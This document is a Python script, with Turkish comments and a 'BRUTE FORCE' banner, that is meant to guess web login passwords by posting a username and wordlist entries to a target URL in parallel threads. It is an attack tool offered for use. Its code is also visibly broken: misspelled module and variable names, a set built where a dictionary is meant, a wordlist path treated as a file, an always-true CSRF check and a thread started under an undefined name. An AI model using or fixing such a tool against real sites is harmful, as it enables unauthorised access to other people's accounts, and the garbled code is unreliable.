
header =""" 

██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████ 
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████   
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██      
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████                                                            


"""
print(header)

import threading # çoklu iş parçacıklar (threads) kullanarak paralel işlemler yapmayı sağlar.
import requests # api lere json formatta data göndermek için.
import time
import sys

class BruteFroceCracker:
    def __init__(self,url,username):
        self.url = url
        self.username = username

    def crack(self,password):
        json_data = {"password:"+password,"username:"+username} #bu kısımda apiye atıcağımız requet'in içindeki json paramatreleri ne ise onları vemeliyiz.
        response = request.post(self.url,data=json_data)
        if("CRSF"or"crsf" in str(response.context)):
            return false
        else:
            print("username ***>"+self.username)
            print("password ***>" + password)


def crack_passwords(passwords,cracker):#verilecek olan cracker değeri BruteForceCracker dan bir nesne olacak.
    for password in passwords:
        password = password.strip() # trim ile aynı işi yapıyor boşlukları kaldırıyor.
        if cracker.crack(passwords):
            return

import regex
def url_validation(url,regex_pattern):
    if regex.fullmatch(regex_pattern,url):
        return True
    else:
        return False


regex_pattern = r"\.(com|tr|org|edu|gov)"

def main():
    url = input("target url: ")
    username = input("username: ")
    passwords_file_path = input("Passwords file path: ")
    if url_validation(url,regex_pattern):
        cracker = BruteFroceCracker(url,username)
        if open(passwords_file_path,"r"):
            chunk_size = 1000
            while True:
                passwords = passwords_file_path.readlines(chunk_size)
                if not passwords:
                    print("Empty File or Wrong Path.")
                    break
                    # bu kullanım threadleri başlatmak için çeşitli bir kullanımdır.
                _thread = threading.Thread(target=crack_passwords(),args=(passwords,cracker))
                t.start()
    else:
        print("invalid url please check.")




banner = """ 
                       Checking the Server !!        
        [+]█████████████████████████████████████████████████[+]
"""


if __name__ == "__main__":
    print("\n\n" + banner)
    main()

